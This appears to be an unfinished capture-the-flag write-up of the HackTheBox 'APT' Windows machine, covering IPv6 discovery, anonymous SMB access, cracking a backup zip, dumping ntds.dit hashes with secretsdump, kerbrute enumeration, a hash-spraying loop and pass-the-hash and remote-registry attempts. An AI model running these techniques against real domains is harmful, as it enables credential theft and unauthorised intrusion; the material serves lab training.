---
title: "APT"
difficulty: Insane
os: Windows
points: 50
rating: 3.7
date: 2020-10-31
avatar: assets/htb/apt.png
htb_url: https://app.hackthebox.com/machines/APT
---

## Enumeration

### Nmap scan

I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to dump all three output formats \(.nmap, .gnmap, and .xml\) under the name `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt <YOUR_IP>
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

PORT    STATE SERVICE REASON  VERSION
80/tcp  open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 132.93 seconds
```

Just two ports were exposed: 80 - HTTP \(IIS\) and 135 - RPC

### Port 80 - HTTP

Picked up an email sales@gigantichosting.com and a phone number \(818\) 995-1560

```text
<!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:12:54 GMT -->
```

The page source referenced the IP `10.13.38.16/` along with HTTrack Website Copier/3.x

* [https://seclists.org/fulldisclosure/2017/May/89](https://seclists.org/fulldisclosure/2017/May/89)
* [https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html](https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html)
* [https://en.kali.tools/?p=443&PageSpeed=noscript](https://en.kali.tools/?p=443&PageSpeed=noscript)

Nearly every page was empty of anything worthwhile. The `/support` page hosted a contact form, so I threw some XSS and SQLi at it.

After submitting, the form bounced me to the IP the site had been cloned from \(10.13.38.16\). Burp couldn't connect either.

That IP wasn't pingable from my end. Dead end.

### Port 1135 - RPC

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ rpcclient -I <YOUR_IP> -U "" -N apt.htb -p 135           
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
```

rpcclient refused to connect, so I was stuck again.

I went looking for ways to enumerate RPC without credentials.

* [https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/)

On a Windows host you might instead use

* [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875578\(v=ws.11](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875578%28v=ws.11)\)

```python
#!/usr/bin/python

import sys, getopt

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from impacket.dcerpc.v5.dcomrt import IObjectExporter

def main(argv):

    try:
        opts, args = getopt.getopt(argv,"ht:",["target="])
    except getopt.GetoptError:
        print('IOXIDResolver.py -t <target>')
        sys.exit(2)

    target_ip = "<YOUR_IP>"

    for opt, arg in opts:
        if opt == '-h':
            print('IOXIDResolver.py -t <target>')
            sys.exit()
        elif opt in ("-t", "--target"):
            target_ip = arg

    authLevel = RPC_C_AUTHN_LEVEL_NONE

    stringBinding = r'ncacn_ip_tcp:%s' % target_ip
    rpctransport = transport.DCERPCTransportFactory(stringBinding)

    portmap = rpctransport.get_dce_rpc()
    portmap.set_auth_level(authLevel)
    portmap.connect()

    objExporter = IObjectExporter(portmap)
    bindings = objExporter.ServerAlive2()

    print("[*] Retrieving network interface of " + target_ip)

    #NetworkAddr = bindings[0]['aNetworkAddr']
    for binding in bindings:
        NetworkAddr = binding['aNetworkAddr']
        print("Address: " + NetworkAddr)

if __name__ == "__main__":
   main(sys.argv[1:])
```

I grabbed the PoC from the article and tweaked the script to point at my target's IP.

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ python3 IOXIDResolver.py <YOUR_IP>
[*] Retrieving network interface of <YOUR_IP>
Address: apt
Address: <YOUR_IP>
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::4d93:3f31:7ea4:6f57
```

Running it returned what I take to be the hostname, the IPv4 address, and a pair of IPv6 addresses

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ ping -c 2 -6 dead:beef::b885:d62a:d679:573f                                                    1 ⨯
PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=68.4 ms
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=2 ttl=63 time=65.4 ms

--- dead:beef::b885:d62a:d679:573f ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 65.438/66.913/68.389/1.475 ms
```

The IPv6 address responded to ping. The TTL of 64 seemed off to me; not sure whether that's typical for IPv6. Pinging the IPv4 address gave the usual 127.

```text
┌──(kac0㉿kali)-[~/htb/apt]
└─$ rpcclient -I dead:beef::b885:d62a:d679:573f -U "" -N apt.htb
rpcclient $>
```

Pointing rpcclient at that IPv6 address let me connect

```text
rpcclient $> lsaquery
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
        APT.HTB        Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
```

Every command kept throwing `NT_STATUS_ACCESS_DENIED`, and I figured I'd come up empty until one finally gave me output. It revealed the hostname `APT.HTB`

I worked through plenty of the remaining commands but couldn't squeeze anything more out of it.

### nmap - IPv6

scanning over IPv6 turned up many more open ports

```
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-03-29 01:18:57Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3269/tcp  open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
49673/tcp open  msrpc        syn-ack Microsoft Windows RPC
49679/tcp open  msrpc        syn-ack Microsoft Windows RPC
49687/tcp open  msrpc        syn-ack Microsoft Windows RPC
```

A whole lot more ports showed up this time. Now it actually looked like a proper Windows server

https://www.ethicalhackx.com/how-to-pwn-on-ipv6/
`[dead:beef::b885:d62a:d679:573f]`

Looking for a way to enumerate Windows over IPv6, I came across an updated build of the well-known enum4linux tool that handles IPv6

* https://hacker-gadgets.com/blog/2020/12/04/enum4linux-ng-a-next-generation-version-of-enum4linux-a-windows-samba-enumeration-tool-with-additional-features-like-json-yaml-export/

What the tool showed me taught me how to query smbclient over IPv6

```
┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U % -L //dead:beef::b885:d62a:d679:573f                               127 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
```

smbclient listed the shares for me, and the backup share stood out

```
┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
└─$ smbclient -t 5 -W htb -U %  //dead:beef::b885:d62a:d679:573f/backup                            1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020

                10357247 blocks of size 4096. 6963935 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (5794.6 KiloBytes/sec) (average 5794.6 KiloBytes/sec)
```

The `backup` share held a backup.zip, which I pulled down to my box

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ unzip backup.zip             
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password
```

The archive was password-protected though not encrypted. A very juicy find indeed. Cracking it open could net me the password hashes for every domain user on the box

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ zip2john backup.zip > backup.hash
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

I then ran `zip2john` to pull out the password hash

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-03-29 21:06) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Feeding the hash to John, it fell in under a second. The password was `iloveyousomuch`

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM
```

With that password the files all extracted cleanly

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ secretsdump.py -ntds 'Active Directory/ntds.dit' -system registry/SYSTEM -security registry/SECURITY LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
[*] DefaultPassword
(Unknown User):Password123!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
[*] NL$KM
 0000   73 4F 34 1D 09 C8 F9 32  23 B9 25 0B DF E2 DC 58   sO4....2#.%....X
 0010   44 41 F2 E0 C0 93 CF AD  2F 2E EB 13 81 77 4B 42   DA....../....wKB
 0020   C2 E0 6D DE 90 79 44 42  F4 C2 AD 4D 7E 3C 6F B2   ..m..yDB...M~<o.
 0030   39 CE 99 95 66 8E AF 7F  1C E0 F6 41 3A 25 DA A8   9...f......A:%..
NL$KM:734f341d09c8f93223b9250bdfe2dc584441f2e0c093cfad2f2eeb1381774b42c2e06dde90794442f4c2ad4d7e3c6fb239ce9995668eaf7f1ce0f6413a25daa8
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::

...snipped 1000s of random users...

[*] ClearText password from Active Directory/ntds.dit
APT$:CLEARTEXT:4[%fo'zG`&BhR3cP[)U2NVS\LEYO/&^)<9xj6%#9\\?uJ4YPb`DRK" IES2fXK"f,X(Ql*fg0RfRq=!,BeAVFt^EVRR-L)VaTjv/QG9=o;G@g>Vab-UYc Yd
[*] Cleaning up...
```

The domain had hundreds of users! Conveniently, a couple of plaintext passwords were in there too

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump > users

┌──(kac0㉿kali)-[~/htb/apt]
└─$ wc -l users 
7996 users
```

Scratch that...it was closer to 8000 users!!

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ awk -F ":" '{print $1}' ntds.dump | grep -v "[*]" | sort | uniq  > users
                                                                                         
┌──(kac0㉿kali)-[~/htb/apt]
└─$ wc -l users                                             
2004 users
```

Looking closer, the list had duplicates. Once I sorted and deduplicated it, only around 2000 remained. Far more manageable, but still a big list to chew through.

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ kerbrute_linux_amd64 userenum --dc apt.htb.local -d htb users                                  1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/29/21 - Ronnie Flathers @ropnop

2021/03/29 21:53:14 >  Using KDC(s):
2021/03/29 21:53:14 >   apt.htb.local:88

2021/03/29 21:53:24 >  [+] VALID USERNAME:       Administrator@htb
2021/03/29 21:54:26 >  [+] VALID USERNAME:       APT$@htb
2021/03/29 22:00:35 >  [+] VALID USERNAME:       henry.vinson@htb
2021/03/29 22:12:34 >  Done! Tested 2004 usernames (3 valid) in 1159.740 seconds
```

kerbrute narrowed the 2000+ down to 3 valid users

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ awk -F":" '{print $3,$4}' ntds.dump | sed 's/ /:/g' > nt_hashes
```

Next I had to identify a valid hash, so I dropped all the hashes into their own file

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ crackmapexec smb apt.htb.local -u henry.vinson -H nt_hashes -d htb
```

crackmapexec gave me nothing back (I'm not even sure it ran...)

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:297f523d69d61de58b690f158f052c1d -dc-ip apt.htb.local htb/henry.vinson
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

Impacket's GetTGT.py let me test a single hash, but there was no built-in way to validate them all at once

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

not enough values to unpack (expected 2, got 1)
```

A bit of bash looped that command over every line in `nt_hashes`. It spat out errors for any line missing both halves of the hash, since this Impacket script requires both parts

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson;done      
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I isolated one properly formatted hash and ran it alone, but now the error complained that my clock was too far out of sync with the DC

* https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast

> If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` it because of your local time, you need to synchronise the host with the DC: ntpdate `<IP of DC>`

I needed to install `ntpdate`

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ sudo ntpdate apt.htb.local                                                                     1 ⨯
29 Mar 23:07:02 ntpdate[794852]: no server suitable for synchronization found
```

Messing with the system clock, I realized it had never sprung forward for daylight savings...

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ sudo ntpdate pool.ntp.org                                                                      1 ⨯
29 Mar 23:14:48 ntpdate[842178]: step time server 194.36.144.87 offset -3599.289748 sec
```

So I just synced against a trusted ntp server (Note: I remembered I'd previously adjusted my clock for another HTB box (find name and link), so this was really just undoing that...)

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 12:17:39 AM EDT
```
The problem persisted... my VM showed one time while the terminal showed another, and `date` was wildly off for whatever reason

https://github.com/byt3bl33d3r/CrackMapExec/issues/339

The following day it just worked. I hadn't rebooted at all (I'd only paused the VM)

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson 2>/dev/null;done                                                        
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
```

This time the enumeration went through (or at least it connected and returned the PREAUTH_FAILED error).  

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(cat nt_hashes);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson | grep -v Impacket | grep -v "KDC_ERR_PREAUTH_FAILED" | tee -a  valid_hash && echo $x >> valid_hash;done

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

More bash trickery filtered out the failed attempts, and I left it running. (Figuring it would take a while, I went and got dinner)

** this is the way **
*  https://github.com/byt3bl33d3r/CrackMapExec/issues/339
```
┌──(kac0㉿kali)-[/etc/ssh]
└─$ sudo ssh kac0@127.0.0.1 -L 445:apt.htb.local:445
```

I enabled ssh locally and then set up port forwarding.  

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ crackmapexec smb -d htb henry.vinson localhost   
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
                                                                                                       
┌──(kac0㉿kali)-[~/htb/apt]
└─$ crackmapexec smb -d htb henry.vinson -H aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb localhost
```

** this is not the way**

but aside from the Windows version banner, I couldn't get it to connect any further

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ crackmapexec --verbose smb -d htb henry.vinson localhost
DEBUG Passed args:
{'aesKey': None,
 'amsi_bypass': None,
 'clear_obfscripts': False,
 'content': False,
 'continue_on_success': False,
 'cred_id': [],
 'darrell': False,
 'depth': None,
 'disks': False,
 'domain': 'htb',
 'exclude_dirs': '',
 'exec_method': None,
 'execute': None,
 'fail_limit': None,
 'force_ps32': False,
 'gen_relay_list': None,
 'get_file': None,
 'gfail_limit': None,
 'groups': None,
 'hash': [],
 'jitter': None,
 'kdcHost': None,
 'kerberos': False,
 'list_modules': False,
 'local_auth': False,
 'local_groups': None,
 'loggedon_users': False,
 'lsa': False,
 'module': None,
 'module_options': [],
 'no_bruteforce': False,
 'no_output': False,
 'ntds': None,
 'obfs': False,
 'only_files': False,
 'pass_pol': False,
 'password': [],
 'pattern': None,
 'port': 445,
 'protocol': 'smb',
 'ps_execute': None,
 'put_file': None,
 'regex': None,
 'rid_brute': None,
 'sam': False,
 'server': 'https',
 'server_host': '0.0.0.0',
 'server_port': None,
 'sessions': False,
 'share': 'C$',
 'shares': False,
 'show_module_options': False,
 'smb_server_port': 445,
 'spider': None,
 'spider_folder': '.',
 'target': ['henry.vinson', 'localhost'],
 'threads': 100,
 'timeout': None,
 'ufail_limit': None,
 'username': [],
 'users': None,
 'verbose': True,
 'wmi': None,
 'wmi_namespace': 'root\\cimv2'}
DEBUG Using selector: EpollSelector
DEBUG Running
DEBUG Started thread poller
DEBUG Error resolving hostname henry.vinson: [Errno -2] Name or service not known
DEBUG Error retrieving os arch of ::1: Could not connect: [Errno 111] Connection refused
SMB         ::1             445    APT              [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb) (signing:True) (SMBv1:True)
DEBUG Stopped thread poller
```

If anyone can point out what I got wrong here, I'd really appreciate it!!

# getTGT way (cont)

* https://www.onsecurity.io/blog/abusing-kerberos-from-linux/

Still hit a time sync error, but only on one hash this time; the rest returned the PREAUTH error

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$cat valid_hash
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
```

still couldn't shake the time sync errors...

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ export KRB5CCNAME=henry.vinson@htb.ccache
```

* https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ net time -S apt.htb.local
Tue Mar 30 21:38:19 2021

┌──(kac0㉿kali)-[~/htb/apt]
└─$ date
Tue 30 Mar 2021 09:28:35 PM EDT
```

the errors came down to my clock being 10 minutes out...Thanks, `net time`!!

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(head -1 test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb/henry.vinson@apt.htb | grep -v Impacket | tee -a valid_hash3 && echo $x >> valid_hash3 ;done

[*] Saving ticket in henry.vinson@apt.htb.ccache
```

And that did the trick!!

### push on

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on apt.htb.local.....
[-] share 'backup' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

The hash looked valid! It listed the shares, but wouldn't connect because none were writable

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

wmiexec.py was denied

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

I began to doubt the hash was valid, even though it had enumerated shares...

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb/henry.vinson@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

I kept working through the relevant impacket tools one by one

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ python3 /usr/local/bin/reg.py -dc-ip apt.htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb apt.htb.local query -keyName HKCU -s
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

nothing worked. I retried each one with the -k option after exporting the ticket to KRB5CCNAME and still got nowhere

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/30/2021 21:54:04  03/31/2021 07:54:04  krbtgt/HTB@HTB.LOCAL
     renew until 03/31/2021 21:52:51
```

* https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html

Turns out the ticket had expired.

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ for x in $(cat test);do getTGT.py -hashes $x -dc-ip apt.htb.local htb.local/henry.vinson@apt.htb | grep -v Impacket | tee -a  valid_hash;done

[*] Saving ticket in henry.vinson@apt.htb.ccache

┌──(kac0㉿kali)-[~/htb/apt]
└─$ klist
Ticket cache: FILE:henry.vinson@apt.htb.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
03/31/2021 20:18:19  04/01/2021 06:18:19  krbtgt/HTB@HTB.LOCAL
     renew until 04/01/2021 20:15:12
```

Rerunning my earlier one-liner (against just the valid hash!) refreshed the timestamp

I went after the registry again, and this time the output took far, far longer to come back (just like everything else on this box!). That convinced me it was finally working. I added the `-s` reg flag to recurse through every key, and started with HKEY-USER since it's a good spot for credentials and other handy system details.  

* https://www.lifewire.com/hkey-users-2625903

> Each registry key located under the HKEY_USERS hive corresponds to a user on the system and is named with that user's security identifier, or SID. The registry keys and registry values located under each SID control settings specific to that user, like mapped drives, installed printers, environment variables, desktop background, and much more, and is loaded when the user first logs on.

```
┌──(kac0㉿kali)-[~/htb/apt]
└─$ python3 /home/kac0/.local/bin/reg.py -k apt.htb.local query -keyName HKLM -s | tee regdump_HKLM

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

While browsing HKU, I tried grabbing HKLM as well, but access was denied.

```
\Software\Microsoft\Windows\CurrentVersion\Explorer\SearchPlatform\Preferences\
        BreadCrumbBarSearchDefault      REG_SZ   MSNSearch
        DisableAutoNavigateURL  REG_DWORD        0x0
        DisableAutoResolveEmailAddrs    REG_DWORD        0x0
        DisableResultsInNewWindow       REG_DWORD        0x0
        DisableTabbedBrowsing   REG_DWORD        0x0
        EditSavedSearch REG_DWORD        0x0
        IEAddressBarSearchDefault       REG_SZ   MSNSearch
```

This user clearly never touches the machine, given their default search engine was still MSN...Surprisingly, the registry dump didn't hold much information at all

```
\Software\Microsoft\Windows\CurrentVersion\Group Policy\GroupMembership\
        Group0  REG_SZ   S-1-5-21-2993095098-2100462451-206186470-513
        Group1  REG_SZ   S-1-1-0
        Group2  REG_SZ   S-1-5-32-545
        Group3  REG_SZ   S-1-5-32-554
        Group4  REG_SZ   S-1-5-4
        Group5  REG_SZ   S-1-2-1
        Group6  REG_SZ   S-1-5-11
        Group7  REG_SZ   S-1-5-15
        Group8  REG_SZ   S-1-2-0
        Group9  REG_SZ   S-1-18-1
        Group10 REG_SZ   S-1-16-8192
        Count   REG_DWORD        0xb
```

The group policy key spelled out which groups this user belonged to. I could resolve the well-known groups from their SIDs.

```
\Volatile Environment\
        LOGONSERVER     REG_SZ   \\APT
        USERDNSDOMAIN   REG_SZ   HTB.LOCAL
        USERDOMAIN      REG_SZ   HTB
        USERNAME        REG_SZ   henry.vinson
        USERPROFILE     REG_SZ   C:\Users\henry.vinson
        HOMEPATH        REG_SZ   \Users\henry.vinson
        HOMEDRIVE       REG_SZ   C:
        APPDATA REG_SZ   C:\Users\henry.vinson\AppData\Roaming
        LOCALAPPDATA    REG_SZ   C:\Users\henry.vinson\AppData\Local
